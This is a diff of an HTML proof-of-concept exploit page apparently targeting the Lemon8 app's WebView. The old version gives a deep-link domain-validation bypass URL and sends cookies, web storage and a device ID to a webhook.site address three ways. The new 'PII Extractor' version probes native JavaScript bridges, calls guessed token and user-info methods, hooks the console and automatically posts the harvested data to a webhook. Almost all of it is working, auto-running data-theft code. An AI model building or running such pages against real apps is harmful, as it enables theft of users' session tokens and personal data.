@@ -3,522 +3,457 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lemon8 Exploit POC</title>
+    <title>Advanced Bridge Probe & PII Extractor</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            font-family: -apple-system, sans-serif;
+            background: #1a1a1a;
+            color: white;
             padding: 20px;
+            font-size: 14px;
         }
         
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 600px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
-            animation: slideIn 0.5s ease-out;
+            max-width: 900px;
+            margin: 0 auto;
+            background: #2d2d2d;
+            border-radius: 15px;
+            padding: 30px;
         }
         
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
+        h1 { color: #e74c3c; margin-bottom: 20px; }
+        h2 { color: #3498db; margin: 20px 0 10px 0; font-size: 18px; }
         
-        h1 {
-            color: #e74c3c;
-            text-align: center;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-        
-        .badge {
-            background: #dc3545;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 20px;
-            display: inline-block;
-            font-size: 14px;
-            font-weight: bold;
-            margin-bottom: 25px;
-        }
-        
-        .success-box {
-            background: #d4edda;
-            border: 2px solid #28a745;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        
-        .success-box h3 {
-            color: #155724;
-            margin-bottom: 10px;
-        }
-        
-        .success-box ul {
-            list-style: none;
-            padding: 0;
-        }
-        
-        .success-box li {
-            padding: 5px 0;
-            color: #155724;
-        }
-        
-        .success-box li:before {
-            content: "✓ ";
-            color: #28a745;
-            font-weight: bold;
-        }
-        
-        .data-box {
-            background: #f8f9fa;
-            border-left: 4px solid #3498db;
+        .log {
+            background: #1a1a1a;
             padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
+            border-radius: 8px;
+            margin: 10px 0;
             max-height: 400px;
             overflow-y: auto;
-        }
-        
-        .data-box h3 {
-            color: #2c3e50;
-            margin-bottom: 10px;
-        }
-        
-        .data-box pre {
-            background: #2c3e50;
-            color: #ecf0f1;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
+            font-family: 'Courier New', monospace;
             font-size: 12px;
-            line-height: 1.5;
         }
+        
+        .log-entry {
+            margin: 5px 0;
+            padding: 5px;
+            border-left: 3px solid #3498db;
+            padding-left: 10px;
+        }
+        
+        .log-success { border-left-color: #27ae60; color: #27ae60; }
+        .log-error { border-left-color: #e74c3c; color: #e74c3c; }
+        .log-info { border-left-color: #3498db; color: #3498db; }
+        .log-data { border-left-color: #f39c12; color: #f39c12; }
         
         button {
-            width: 100%;
-            padding: 15px;
             background: #e74c3c;
             color: white;
             border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
+            padding: 12px 24px;
+            border-radius: 8px;
             cursor: pointer;
-            margin: 10px 0;
-            transition: all 0.3s;
-        }
-        
-        button:hover {
-            background: #c0392b;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-        }
-        
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-            color: #856404;
-        }
-        
-        .center {
-            text-align: center;
-        }
-        
-        .status {
-            display: inline-block;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            font-weight: bold;
             margin: 5px;
+            font-weight: 600;
         }
         
-        .status-success {
-            background: #28a745;
-            color: white;
+        button:hover { background: #c0392b; }
+        
+        .data-box {
+            background: #34495e;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            word-wrap: break-word;
         }
         
-        .status-error {
-            background: #dc3545;
-            color: white;
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="center">
-            <h1>🔴 Remote Exploit POC</h1>
-            <span class="badge">CVSS 9.3 - CRITICAL</span>
+        <h1>🔴 Advanced Bridge Probe & PII Extractor</h1>
+        
+        <div style="margin-bottom: 20px;">
+            <button onclick="probeAllBridges()">🔍 Probe All Bridges</button>
+            <button onclick="attemptPIIExtraction()">📡 Extract PII</button>
+            <button onclick="clearLog()">🗑️ Clear Log</button>
+            <button onclick="exfiltrateResults()">📤 Send to Webhook</button>
         </div>
         
-        <div class="success-box">
-            <h3>✅ Exploitation Successful!</h3>
-            <ul>
-                <li>Deep link opened Lemon8 app</li>
-                <li>Bypassed domain validation</li>
-                <li>Loaded remote HTML without Frida</li>
-                <li>JavaScript execution confirmed</li>
-                <li>No jailbreak required</li>
-            </ul>
-        </div>
+        <h2>📊 Live Log</h2>
+        <div id="logContainer" class="log"></div>
         
-        <div class="warning">
-            <strong>⚠️ Attack Vector:</strong><br>
-            <code>snssdk2657://webview?url=https://lemon8-app.com\@10.0.0.74:8082/malicious.html</code>
-        </div>
-        
-        <button onclick="extractData()">📡 Extract App Data</button>
-        <button onclick="testBridges()">🔍 Test JavaScript Bridges</button>
-        <button onclick="demonstrateXSS()">⚡ Execute XSS</button>
-        
-        <div id="bridgeStatus" class="center" style="margin: 20px 0;"></div>
-        
-        <div id="dataDisplay" class="data-box" style="display: none;">
-            <h3>🎯 Extracted Data</h3>
-            <pre id="extractedData"></pre>
+        <h2>🎯 Extracted Data</h2>
+        <div id="dataContainer" class="data-box">
+            <pre id="extractedData">Waiting for extraction...</pre>
         </div>
     </div>
     
     <script>
-        console.log('[EXPLOIT] ========================================');
-        console.log('[EXPLOIT] Remote malicious.html loaded successfully');
-        console.log('[EXPLOIT] Deep Link Attack: CONFIRMED');
-        console.log('[EXPLOIT] CVSS Score: 9.3 CRITICAL');
-        console.log('[EXPLOIT] ========================================');
+        // REPLACE WITH YOUR WEBHOOK URL FROM webhook.site
+        const WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-ID';
         
-        // Detect environment
-        console.log('[INFO] User Agent:', navigator.userAgent);
-        console.log('[INFO] Current URL:', window.location.href);
-        console.log('[INFO] Referrer:', document.referrer);
+        const results = {
+            timestamp: new Date().toISOString(),
+            bridges: {},
+            windowObjects: {},
+            attemptedCalls: {},
+            extractedPII: {}
+        };
         
-        // Auto-detect bridges on load
-        window.addEventListener('load', function() {
-            detectBridges();
-        });
+        // ==============================================
+        // LOGGING
+        // ==============================================
+        function log(message, type = 'info') {
+            const logContainer = document.getElementById('logContainer');
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logContainer.appendChild(entry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+            console.log(`[${type.toUpperCase()}]`, message);
+        }
         
-        function detectBridges() {
-            console.log('[BRIDGE] Detecting available JavaScript bridges...');
+        function clearLog() {
+            document.getElementById('logContainer').innerHTML = '';
+            log('Log cleared', 'info');
+        }
+        
+        function updateDataDisplay() {
+            document.getElementById('extractedData').textContent = JSON.stringify(results, null, 2);
+        }
+        
+        // ==============================================
+        // BRIDGE ENUMERATION
+        // ==============================================
+        function probeAllBridges() {
+            log('========================================', 'info');
+            log('Starting comprehensive bridge enumeration', 'info');
+            log('========================================', 'info');
             
-            const bridges = [];
-            const statusDiv = document.getElementById('bridgeStatus');
-            
-            // Test JSBridge
+            // 1. Check for JSBridge
             if (typeof window.JSBridge !== 'undefined') {
-                bridges.push('JSBridge');
-                console.log('[BRIDGE] ✓ JSBridge detected');
-                if (window.JSBridge._handleMessageFromApp) {
-                    console.log('[BRIDGE] ✓ JSBridge._handleMessageFromApp is callable');
+                log('✓ JSBridge found!', 'success');
+                results.bridges.JSBridge = {
+                    available: true,
+                    type: typeof window.JSBridge,
+                    keys: Object.keys(window.JSBridge),
+                    methods: {}
+                };
+                
+                // Enumerate all JSBridge methods
+                for (let key in window.JSBridge) {
+                    const type = typeof window.JSBridge[key];
+                    results.bridges.JSBridge.methods[key] = type;
+                    log(`  JSBridge.${key}: ${type}`, 'info');
                 }
+            } else {
+                log('✗ JSBridge not found', 'error');
+                results.bridges.JSBridge = { available: false };
             }
             
-            // Test __globalprops
+            // 2. Check for __globalprops
             if (typeof window.__globalprops !== 'undefined') {
-                bridges.push('__globalprops');
-                console.log('[BRIDGE] ✓ __globalprops detected');
+                log('✓ __globalprops found!', 'success');
+                results.bridges.__globalprops = {
+                    available: true,
+                    type: typeof window.__globalprops,
+                    keys: Object.keys(window.__globalprops)
+                };
+                
+                // Try to call getGlobalProps
                 if (window.__globalprops.getGlobalProps) {
-                    console.log('[BRIDGE] ✓ __globalprops.getGlobalProps is callable');
+                    try {
+                        const propsStr = window.__globalprops.getGlobalProps();
+                        const props = JSON.parse(propsStr);
+                        results.extractedPII.globalProps = props;
+                        log('✓ Global props extracted!', 'success');
+                        log(`  Device ID: ${props.did}`, 'data');
+                        log(`  Device Model: ${props.deviceModel}`, 'data');
+                    } catch (e) {
+                        log(`✗ Error parsing global props: ${e.message}`, 'error');
+                    }
                 }
+            } else {
+                log('✗ __globalprops not found', 'error');
+                results.bridges.__globalprops = { available: false };
             }
             
-            // Test imy_realxhr_callback
-            if (typeof window.imy_realxhr_callback !== 'undefined') {
-                bridges.push('imy_realxhr_callback');
-                console.log('[BRIDGE] ✓ imy_realxhr_callback detected');
-            }
-            
-            // Test SlardarHybrid
-            if (typeof window.SlardarHybrid !== 'undefined') {
-                bridges.push('SlardarHybrid');
-                console.log('[BRIDGE] ✓ SlardarHybrid detected');
-            }
-            
-            // Test WebKit message handlers
+            // 3. Check for WebKit message handlers
             if (window.webkit && window.webkit.messageHandlers) {
                 const handlers = Object.keys(window.webkit.messageHandlers);
-                if (handlers.length > 0) {
-                    bridges.push('WKMessageHandlers');
-                    console.log('[BRIDGE] ✓ WKMessageHandlers:', handlers);
-                }
-            }
-            
-            // Update UI
-            if (bridges.length > 0) {
-                statusDiv.innerHTML = bridges.map(b => 
-                    `<span class="status status-success">${b}</span>`
-                ).join('');
+                log(`✓ WebKit messageHandlers found: ${handlers.length}`, 'success');
+                results.bridges.webkitMessageHandlers = {
+                    available: true,
+                    handlers: handlers
+                };
+                handlers.forEach(h => log(`  Handler: ${h}`, 'info'));
             } else {
-                statusDiv.innerHTML = '<span class="status status-error">No bridges detected</span>';
+                log('✗ WebKit messageHandlers not found', 'error');
+                results.bridges.webkitMessageHandlers = { available: false };
             }
             
-            return bridges;
-        }
-        
-        function extractData() {
-            console.log('[EXTRACT] Starting data extraction...');
+            // 4. Enumerate ALL window objects
+            log('Enumerating all window objects...', 'info');
+            const interestingKeys = [];
             
-            const data = {
-                timestamp: new Date().toISOString(),
-                exploitation: {
-                    method: 'Deep Link - Backslash Bypass',
-                    deepLink: 'snssdk2657://webview?url=https://lemon8-app.com\\@10.0.0.74:8082/malicious.html',
-                    complexity: 'LOW - No Frida required',
-                    cvss: '9.3 CRITICAL'
-                },
-                environment: {
-                    userAgent: navigator.userAgent,
-                    url: window.location.href,
-                    referrer: document.referrer,
-                    cookieEnabled: navigator.cookieEnabled,
-                    language: navigator.language,
-                    platform: navigator.platform
-                },
-                cookies: document.cookie || '(none)',
-                localStorage: {},
-                sessionStorage: {},
-                globalProps: null,
-                bridges: {}
-            };
-            
-            // Extract localStorage
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    data.localStorage[key] = localStorage.getItem(key);
-                }
-                console.log('[EXTRACT] ✓ localStorage extracted:', Object.keys(data.localStorage).length, 'items');
-            } catch (e) {
-                console.log('[EXTRACT] ✗ localStorage access denied:', e.message);
-                data.localStorage = {error: e.message};
-            }
-            
-            // Extract sessionStorage
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    data.sessionStorage[key] = sessionStorage.getItem(key);
-                }
-                console.log('[EXTRACT] ✓ sessionStorage extracted:', Object.keys(data.sessionStorage).length, 'items');
-            } catch (e) {
-                console.log('[EXTRACT] ✗ sessionStorage access denied:', e.message);
-                data.sessionStorage = {error: e.message};
-            }
-            
-            // Extract global props
-            if (window.__globalprops && window.__globalprops.getGlobalProps) {
+            for (let key in window) {
                 try {
-                    const propsStr = window.__globalprops.getGlobalProps();
-                    data.globalProps = JSON.parse(propsStr);
-                    console.log('[EXTRACT] ✓ Global props extracted');
-                    console.log('[EXTRACT] Device ID:', data.globalProps.did);
-                } catch (e) {
-                    console.log('[EXTRACT] ✗ Global props error:', e.message);
-                    data.globalProps = {error: e.message};
-                }
+                    const keyLower = key.toLowerCase();
+                    if (keyLower.includes('user') || keyLower.includes('auth') || 
+                        keyLower.includes('token') || keyLower.includes('session') ||
+                        keyLower.includes('api') || keyLower.includes('bridge') ||
+                        keyLower.includes('account') || keyLower.includes('profile') ||
+                        keyLower.includes('cookie') || keyLower.includes('storage')) {
+                        
+                        const value = window[key];
+                        const type = typeof value;
+                        
+                        interestingKeys.push(key);
+                        results.windowObjects[key] = {
+                            type: type,
+                            keys: type === 'object' && value !== null ? Object.keys(value).slice(0, 50) : []
+                        };
+                        
+                        log(`  window.${key}: ${type}`, 'data');
+                    }
+                } catch (e) {}
             }
             
-            // Test bridge accessibility
-            data.bridges.JSBridge = typeof window.JSBridge !== 'undefined' ? 'ACCESSIBLE' : 'NOT FOUND';
-            data.bridges.__globalprops = typeof window.__globalprops !== 'undefined' ? 'ACCESSIBLE' : 'NOT FOUND';
-            data.bridges.imy_realxhr_callback = typeof window.imy_realxhr_callback !== 'undefined' ? 'ACCESSIBLE' : 'NOT FOUND';
-            data.bridges.SlardarHybrid = typeof window.SlardarHybrid !== 'undefined' ? 'ACCESSIBLE' : 'NOT FOUND';
+            log(`Found ${interestingKeys.length} potentially interesting window objects`, 'success');
             
-            // Display extracted data
-            const dataDisplay = document.getElementById('dataDisplay');
-            const extractedData = document.getElementById('extractedData');
-            
-            extractedData.textContent = JSON.stringify(data, null, 2);
-            dataDisplay.style.display = 'block';
-            
-            console.log('[EXTRACT] ========================================');
-            console.log('[EXTRACT] COMPLETE DATA DUMP:');
-            console.log(JSON.stringify(data, null, 2));
-            console.log('[EXTRACT] ========================================');
-            
-            // Attempt to exfiltrate to attacker server
-            exfiltrateData(data);
-            
-            alert('✅ Data extraction complete!\n\nCheck console for full dump.\nData displayed below.');
+            updateDataDisplay();
         }
         
-        function exfiltrateData(data) {
-            console.log('[EXFIL] Attempting to send data to attacker server...');
+        // ==============================================
+        // PII EXTRACTION ATTEMPTS
+        // ==============================================
+        function attemptPIIExtraction() {
+            log('========================================', 'info');
+            log('Attempting to extract PII via bridge calls', 'info');
+            log('========================================', 'info');
             
-            // REPLACE THIS URL WITH YOUR WEBHOOK
-            // Get free webhook at: https://webhook.site
-            const WEBHOOK_URL = https://webhook.site/b9c05ffc-2382-425d-9df0-e6ee8628d67c;
+            // Method 1: Try common bridge method names
+            const methodsToTry = [
+                'getUserInfo', 'getUser', 'getCurrentUser', 'getUserData',
+                'getProfile', 'getAccountInfo', 'getUserProfile',
+                'getAccessToken', 'getToken', 'getAuthToken', 'getSessionToken',
+                'getCookies', 'getCookie', 'getAuthCookie',
+                'getUserID', 'getUserId', 'getDeviceInfo',
+                'getAccountData', 'getSettings', 'getUserSettings'
+            ];
             
-            // Try multiple exfiltration methods
+            results.attemptedCalls.directMethods = {};
             
-            // Method 1: Fetch API (Primary)
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            }).then(response => {
-                console.log('[EXFIL] ✓ Fetch successful:', response.status);
-                alert('✅ Data exfiltrated!\n\nCheck your webhook at:\n' + WEBHOOK_URL);
-            }).catch(error => {
-                console.log('[EXFIL] ✗ Fetch failed:', error.message);
+            methodsToTry.forEach(method => {
+                // Try on JSBridge
+                if (window.JSBridge && typeof window.JSBridge[method] === 'function') {
+                    try {
+                        log(`Calling JSBridge.${method}()...`, 'info');
+                        const result = window.JSBridge[method]();
+                        results.attemptedCalls.directMethods[method] = result;
+                        log(`✓ JSBridge.${method}() returned data!`, 'success');
+                        log(`  Result: ${JSON.stringify(result)}`, 'data');
+                    } catch (e) {
+                        log(`✗ JSBridge.${method}() failed: ${e.message}`, 'error');
+                    }
+                }
+                
+                // Try on window directly
+                if (typeof window[method] === 'function') {
+                    try {
+                        log(`Calling window.${method}()...`, 'info');
+                        const result = window[method]();
+                        results.attemptedCalls.directMethods[`window_${method}`] = result;
+                        log(`✓ window.${method}() returned data!`, 'success');
+                        log(`  Result: ${JSON.stringify(result)}`, 'data');
+                    } catch (e) {
+                        log(`✗ window.${method}() failed: ${e.message}`, 'error');
+                    }
+                }
             });
             
-            // Method 2: Image beacon (Backup)
-            const img = new Image();
-            img.src = WEBHOOK_URL + '?method=beacon&data=' + encodeURIComponent(JSON.stringify(data).substring(0, 2000));
-            console.log('[EXFIL] ✓ Image beacon sent');
-            
-            // Method 3: Navigator.sendBeacon (Backup)
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(WEBHOOK_URL + '?method=sendBeacon', JSON.stringify(data));
-                console.log('[EXFIL] ✓ SendBeacon sent');
-            }
-        }
-        
-        function testBridges() {
-            console.log('[TEST] Testing JavaScript bridge functionality...');
-            
-            let report = '🔍 Bridge Test Results:\n\n';
-            
-            // Test JSBridge
+            // Method 2: Try JSBridge._handleMessageFromApp patterns
             if (window.JSBridge && window.JSBridge._handleMessageFromApp) {
-                report += '✅ JSBridge._handleMessageFromApp: ACCESSIBLE\n';
-                console.log('[TEST] ✓ JSBridge is callable');
+                log('Attempting JSBridge._handleMessageFromApp calls...', 'info');
                 
-                // Attempt to call (be careful - this might trigger app behavior)
-                try {
-                    const testMessage = {
-                        __params: {
-                            code: 1,
-                            data: {test: 'POC'},
-                            msg: 'SECURITY_TEST'
-                        }
-                    };
-                    console.log('[TEST] Attempting JSBridge call:', testMessage);
-                    // Uncomment to actually call: window.JSBridge._handleMessageFromApp(testMessage);
-                    report += '   Can invoke native code execution\n';
-                } catch (e) {
-                    report += '   Error calling: ' + e.message + '\n';
-                }
-            } else {
-                report += '❌ JSBridge: NOT FOUND\n';
-            }
-            
-            // Test __globalprops
-            if (window.__globalprops && window.__globalprops.getGlobalProps) {
-                report += '\n✅ __globalprops.getGlobalProps: ACCESSIBLE\n';
-                try {
-                    const props = JSON.parse(window.__globalprops.getGlobalProps());
-                    report += `   Device ID: ${props.did}\n`;
-                    report += `   Device Model: ${props.deviceModel}\n`;
-                    report += `   App Version: ${props.versionName || 'N/A'}\n`;
-                } catch (e) {
-                    report += '   Error: ' + e.message + '\n';
-                }
-            } else {
-                report += '\n❌ __globalprops: NOT FOUND\n';
-            }
-            
-            // Test WebKit message handlers
-            if (window.webkit && window.webkit.messageHandlers) {
-                const handlers = Object.keys(window.webkit.messageHandlers);
-                report += '\n✅ WKMessageHandlers: ' + handlers.length + ' found\n';
-                handlers.forEach(h => {
-                    report += `   - ${h}\n`;
+                const bridgeMessages = [
+                    { namespace: 'user', method: 'getUserInfo', params: {} },
+                    { namespace: 'user', method: 'getCurrentUser', params: {} },
+                    { namespace: 'auth', method: 'getToken', params: {} },
+                    { namespace: 'auth', method: 'getAccessToken', params: {} },
+                    { namespace: 'account', method: 'getAccountInfo', params: {} },
+                    { namespace: 'profile', method: 'getProfile', params: {} },
+                    { namespace: 'session', method: 'getSessionData', params: {} }
+                ];
+                
+                results.attemptedCalls.bridgeMessages = [];
+                
+                bridgeMessages.forEach(msg => {
+                    try {
+                        const message = {
+                            __params: {
+                                code: 1,
+                                data: msg
+                            },
+                            __callback_id: `extractor_${Date.now()}`
+                        };
+                        
+                        log(`Sending bridge message: ${msg.namespace}.${msg.method}`, 'info');
+                        window.JSBridge._handleMessageFromApp(message);
+                        results.attemptedCalls.bridgeMessages.push({
+                            message: msg,
+                            sent: true
+                        });
+                    } catch (e) {
+                        log(`✗ Bridge message failed: ${e.message}`, 'error');
+                    }
                 });
-            } else {
-                report += '\n❌ WKMessageHandlers: NOT FOUND\n';
             }
             
-            console.log(report);
-            alert(report);
+            // Method 3: Try WebKit message handlers
+            if (window.webkit && window.webkit.messageHandlers) {
+                log('Attempting WebKit messageHandler calls...', 'info');
+                
+                const handlers = Object.keys(window.webkit.messageHandlers);
+                results.attemptedCalls.webkitCalls = {};
+                
+                handlers.forEach(handler => {
+                    try {
+                        const messages = [
+                            { action: 'getUserInfo', callback: 'extractorCallback' },
+                            { action: 'getUser', callback: 'extractorCallback' },
+                            { action: 'getToken', callback: 'extractorCallback' },
+                            { method: 'getUserInfo' },
+                            { type: 'getUserInfo' },
+                            { getUserInfo: true }
+                        ];
+                        
+                        messages.forEach((msg, idx) => {
+                            try {
+                                log(`Posting to ${handler}: ${JSON.stringify(msg)}`, 'info');
+                                window.webkit.messageHandlers[handler].postMessage(msg);
+                                if (!results.attemptedCalls.webkitCalls[handler]) {
+                                    results.attemptedCalls.webkitCalls[handler] = [];
+                                }
+                                results.attemptedCalls.webkitCalls[handler].push({
+                                    message: msg,
+                                    sent: true
+                                });
+                            } catch (e) {
+                                log(`✗ Handler ${handler} call ${idx} failed: ${e.message}`, 'error');
+                            }
+                        });
+                    } catch (e) {
+                        log(`✗ Handler ${handler} error: ${e.message}`, 'error');
+                    }
+                });
+            }
+            
+            // Method 4: Try to access WKWebView's cookies via document.cookie
+            log('Checking document.cookie...', 'info');
+            const cookies = document.cookie;
+            if (cookies) {
+                results.extractedPII.cookies = cookies;
+                log(`✓ Cookies found: ${cookies}`, 'data');
+            } else {
+                log('✗ No cookies accessible', 'error');
+            }
+            
+            // Method 5: Check for any storage
+            try {
+                const localStorageData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
+                }
+                if (Object.keys(localStorageData).length > 0) {
+                    results.extractedPII.localStorage = localStorageData;
+                    log(`✓ localStorage data found: ${Object.keys(localStorageData).length} items`, 'success');
+                }
+            } catch (e) {
+                log(`✗ localStorage access failed: ${e.message}`, 'error');
+            }
+            
+            log('PII extraction attempts complete', 'info');
+            log('Check "Extracted Data" section for results', 'info');
+            
+            updateDataDisplay();
         }
         
-        function demonstrateXSS() {
-            console.log('[XSS] Demonstrating cross-site scripting execution...');
+        // Callback for async bridge responses
+        window.extractorCallback = function(data) {
+            log('========================================', 'success');
+            log('✓✓✓ CALLBACK RECEIVED FROM APP! ✓✓✓', 'success');
+            log('========================================', 'success');
+            log(`Data: ${JSON.stringify(data)}`, 'data');
             
-            // Create visible proof of XSS
-            const overlay = document.createElement('div');
-            overlay.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                right: 0;
-                bottom: 0;
-                background: rgba(0,0,0,0.9);
-                z-index: 9999;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                animation: fadeIn 0.3s;
-            `;
+            if (!results.extractedPII.callbacks) {
+                results.extractedPII.callbacks = [];
+            }
+            results.extractedPII.callbacks.push({
+                timestamp: new Date().toISOString(),
+                data: data
+            });
             
-            overlay.innerHTML = `
-                <div style="background: white; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px;">
-                    <h1 style="color: #e74c3c; margin-bottom: 20px;">🔴 XSS CONFIRMED</h1>
-                    <p style="font-size: 16px; margin-bottom: 20px; color: #333;">
-                        Full JavaScript execution in Lemon8 WebView
-                    </p>
-                    <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: left;">
-                        <strong>Attack Details:</strong><br>
-                        <small>
-                        • Vector: Deep Link Injection<br>
-                        • Method: Backslash Bypass<br>
-                        • Complexity: LOW (no Frida)<br>
-                        • CVSS: 9.3 CRITICAL
-                        </small>
-                    </div>
-                    <button onclick="this.parentElement.parentElement.remove()" 
-                            style="width: 100%; padding: 15px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer;">
-                        Close
-                    </button>
-                </div>
-            `;
+            updateDataDisplay();
             
-            document.body.appendChild(overlay);
+            // Auto-exfiltrate
+            exfiltrateResults();
+        };
+        
+        // ==============================================
+        // EXFILTRATION
+        // ==============================================
+        function exfiltrateResults() {
+            log('Attempting to exfiltrate results...', 'info');
             
-            // Also show alert
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(results)
+            }).then(r => {
+                log('✓ Data exfiltrated successfully!', 'success');
+                log(`Check your webhook: ${WEBHOOK_URL}`, 'data');
+            }).catch(e => {
+                log(`✗ Exfiltration failed: ${e.message}`, 'error');
+                log('Data is still available in console and on screen', 'info');
+            });
+        }
+        
+        // ==============================================
+        // AUTO-RUN ON LOAD
+        // ==============================================
+        window.addEventListener('load', function() {
+            log('Page loaded in Lemon8 WebView', 'success');
+            log('Starting automatic reconnaissance...', 'info');
+            
             setTimeout(() => {
-                alert('🔴 XSS CONFIRMED!\n\n' +
-                      'Full JavaScript execution in WebView\n\n' +
-                      'Attack Vector: Remote Deep Link\n' +
-                      'Complexity: LOW (no Frida required)\n' +
-                      'Impact: Session hijacking, data theft, phishing\n\n' +
-                      'CVSS Score: 9.3 CRITICAL');
-            }, 500);
-            
-            console.log('[XSS] ✓ Demonstration complete');
-        }
+                probeAllBridges();
+                setTimeout(() => {
+                    attemptPIIExtraction();
+                }, 2000);
+            }, 1000);
+        });
         
-        // Auto-execute on page load
-        console.log('[AUTO] Auto-executing reconnaissance...');
-        setTimeout(() => {
-            detectBridges();
-            console.log('[AUTO] Page fully loaded and analyzed');
-        }, 500);
+        // Monitor for any unexpected data
+        console.log = (function(oldLog) {
+            return function(...args) {
+                const message = args.join(' ');
+                if (message.includes('user') || message.includes('token') || message.includes('auth')) {
+                    log(`Console: ${message}`, 'data');
+                }
+                oldLog.apply(console, args);
+            };
+        })(console.log);
+        
     </script>
 </body>
 </html>
